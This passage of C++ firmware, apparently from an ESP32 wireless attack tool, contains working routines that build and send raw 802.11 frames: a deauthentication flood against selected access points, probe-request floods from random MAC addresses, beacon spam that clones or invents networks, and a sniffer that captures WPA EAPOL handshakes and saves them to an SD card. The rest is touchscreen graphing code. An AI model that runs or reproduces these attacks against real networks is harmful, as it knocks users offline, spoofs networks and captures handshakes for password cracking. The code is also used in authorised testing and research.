  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
  
}

// Function for sending crafted beacon frames
void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {

  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  // Randomize SSID (Fixed size 6. Lazy right?)
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + 6 + i] = postSSID[i];

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send probe flood to all "active" access points
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet
      // Randomize SRC MAC
      
      prob_req_packet[10] = random(256);
      prob_req_packet[11] = random(256);
      prob_req_packet[12] = random(256);
      prob_req_packet[13] = random(256);
      prob_req_packet[14] = random(256);
      prob_req_packet[15] = random(256);

      // Set SSID length
      int ssidLen = access_points->get(i).essid.length();
      //int rand_len = sizeof(rand_reg);
      int fullLen = ssidLen;
      prob_req_packet[25] = fullLen;

      // Insert ESSID
      char buf[access_points->get(i).essid.length() + 1] = {};
      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
      
      for(int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];
        
      /*
       * 0x01, 0x08, 0x8c, 0x12, 0x18, 0x24, 
                                  0x30, 0x48, 0x60, 0x6c, 0x2d, 0x1a, 
                                  0xad, 0x01, 0x17, 0xff, 0xff, 0x00, 
                                  0x00, 0x7e, 0x00, 0x00, 0x00, 0x00, 
                                  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                                  0x00, 0x00
       */

      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
                              0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
                              0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
                              0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00};

      uint8_t good_probe_req_packet[26 + fullLen + 40] = {};
      
      for (int i = 0; i < 26 + fullLen; i++)
        good_probe_req_packet[i] = prob_req_packet[i];

      for(int i = 0; i < 40; i++) 
        good_probe_req_packet[26 + fullLen + i] = postSSID[i];

      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

      packets_sent = packets_sent + 3;
    }
  }
}

void WiFiScan::sendDeauthAttack(uint32_t currentTime) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet
      
      deauth_frame_default[10] = access_points->get(i).bssid[0];
      deauth_frame_default[11] = access_points->get(i).bssid[1];
      deauth_frame_default[12] = access_points->get(i).bssid[2];
      deauth_frame_default[13] = access_points->get(i).bssid[3];
      deauth_frame_default[14] = access_points->get(i).bssid[4];
      deauth_frame_default[15] = access_points->get(i).bssid[5];

      deauth_frame_default[16] = access_points->get(i).bssid[0];
      deauth_frame_default[17] = access_points->get(i).bssid[1];
      deauth_frame_default[18] = access_points->get(i).bssid[2];
      deauth_frame_default[19] = access_points->get(i).bssid[3];
      deauth_frame_default[20] = access_points->get(i).bssid[4];
      deauth_frame_default[21] = access_points->get(i).bssid[5];      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

      packets_sent = packets_sent + 3;
    }
  }
}


void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    if (snifferPacket->payload[0] == 0x80)
    {
      num_beacon++;
    }
    else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
    {
      num_deauth++;
    }
    else if (snifferPacket->payload[0] == 0x40)
    {
      num_probe++;
    }

    if (save_packet)
      sd_obj.addPacket(snifferPacket->payload, len);
  }
}

void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

    for (int i = 0; i < len; i++) {
      char hexCar[4];
      sprintf(hexCar, "%02X", snifferPacket->payload[i]);
      Serial.print(hexCar);
      //Serial.print(snifferPacket->payload[i], HEX);
      if ((i + 1) % 16 == 0)
        Serial.print("\n");
      else
        Serial.print(" ");
    }
  
    Serial.print("\n");
  }

  if (save_packet)
    sd_obj.addPacket(snifferPacket->payload, len);
}

#ifdef HAS_SCREEN
  void WiFiScan::eapolMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
  
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
  
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
  
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      pressed = display_obj.tft.getTouch(&t_x, &t_y);
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
  
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
  
          // Channel - button pressed
          if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              //display_obj.tftDrawXScaleButtons(x_scale);
              //display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              //display_obj.tftDrawXScaleButtons(x_scale);
              //display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= (GRAPH_REFRESH * 5)) {
        //Serial.println("-----------------------------------------");
        //Serial.println("Time elapsed: " + (String)(currentTime - initTime) + "ms");
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_eapol * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        if (y_pos_x >= HEIGHT_1) {
          Serial.println("Max EAPOL number reached. Adjusting...");
          num_eapol = 0;
        }
        //y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        //y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
  
        //Serial.println("num_beacon: " + (String)num_beacon);
        //Serial.println("num_deauth: " + (String)num_deauth);
        //Serial.println(" num_probe: " + (String)num_probe);
  
        //num_beacon = 0;
        //num_probe = 0;
        //num_deauth = 0;
  
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_CYAN);
        //Plot "Z" value
        //display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        //display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
  
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        //if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <= 320))) //above x axis
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        //if ((x_pos >= 254) && (x_pos <= 320)) //below x axis
        //if (x_pos <= 90)
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
  
        //tftDisplayTime();
  
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
  
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        //y_pos_y_old = y_pos_y;
        //y_pos_z_old = y_pos_z;
  
        //delay(50);
      }
  
      sd_obj.main();
  
    }
  
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawEapolColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }

  void WiFiScan::packetMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
    
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
      
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
      
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      pressed = display_obj.tft.getTouch(&t_x, &t_y);
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
      
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
          
          // X - button pressed
          if (b == 0) {
            if (x_scale > 1) {
              x_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
          // X + button pressed
          else if (b == 1) {
            if (x_scale < 6) {
              x_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
  
          // Y - button pressed
          else if (b == 2) {
            if (y_scale > 1) {
              y_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Y + button pressed
          else if (b == 3) {
            if (y_scale < 9) {
              y_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Channel - button pressed
          else if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= GRAPH_REFRESH) {
        //Serial.println("-----------------------------------------");
        //Serial.println("Time elapsed: " + (String)(currentTime - initTime) + "ms");
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_beacon * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
  
        //Serial.println("num_beacon: " + (String)num_beacon);
        //Serial.println("num_deauth: " + (String)num_deauth);
        //Serial.println(" num_probe: " + (String)num_probe);
    
        num_beacon = 0;
        num_probe = 0;
        num_deauth = 0;
        
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_GREEN);
        //Plot "Z" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
        
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        //if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <= 320))) //above x axis
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        //if ((x_pos >= 254) && (x_pos <= 320)) //below x axis
        //if (x_pos <= 90)
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
        
        //tftDisplayTime();
        
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
         
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        y_pos_y_old = y_pos_y;
        y_pos_z_old = y_pos_z;
    
        //delay(50);
      }
  
      sd_obj.main();
     
    }
    
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    //tft.fillRect(56, 0, 66, 32, TFT_ORANGE); //erase time and color key and any stray lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    
    display_obj.tftDrawXScaleButtons(x_scale); //redraw stuff
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }
#endif

//void WiFiScan::sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
//  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
//  showMetadata(snifferPacket, type);
//}

void WiFiScan::changeChannel()
{
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

// Function to cycle to the next channel
void WiFiScan::channelHop()
{
  this->set_channel = this->set_channel + 1;
  if (this->set_channel > 13) {
    this->set_channel = 1;
  }
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

char* WiFiScan::stringToChar(String string) {
  char buf[string.length() + 1] = {};
  string.toCharArray(buf, string.length() + 1);

  return buf;
}


// Function for updating scan status
void WiFiScan::main(uint32_t currentTime)
{
  // WiFi operations
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_ESPRESSIF) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_SCAN_ALL))
  {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
  }
  else if (currentScanMode == WIFI_PACKET_MONITOR)
  {
    #ifdef HAS_SCREEN
      packetMonitorMain(currentTime);
    #endif
  }
  else if (currentScanMode == WIFI_SCAN_EAPOL)
  {
    #ifdef HAS_SCREEN
      eapolMonitorMain(currentTime);
    #endif
  }
  else if (currentScanMode == WIFI_ATTACK_AUTH) {
    for (int i = 0; i < 55; i++)
      this->sendProbeAttack(currentTime);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, 160);
        display_obj.showCenterText(displayString, 160);
      #endif
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthAttack(currentTime);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, 160);
        display_obj.showCenterText(displayString, 160);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, ssid{access_points->get(i).essid, {random(256), 
                                                                                    random(256), 
                                                                                    random(256), 
                                                                                    random(256), 
                                                                                    random(256), 
                                                                                    random(256)}});
    }
      

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, 160);
        display_obj.showCenterText(displayString, 160);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 55; i++)
      broadcastRandomSSID(currentTime);

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, 160);
        display_obj.showCenterText(displayString, 160);
      #endif
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST)) {
    for (int i = 0; i < ssids->size(); i++)
      this->broadcastCustomBeacon(currentTime, ssids->get(i));

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_AP_SPAM)) {
    for (int i = 0; i < access_points->size(); i++)
      this->broadcastCustomBeacon(currentTime, access_points->get(i));

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_RICK_ROLL))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 7; i++)
    {
      for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
      {
        broadcastSetSSID(currentTime, rick_roll[x]);
      }
    }

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      #ifdef HAS_SCREEN
        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
        display_obj.showCenterText(displayString2, 160);
        display_obj.showCenterText(displayString, 160);
      #endif
      packets_sent = 0;
    }
  }
}
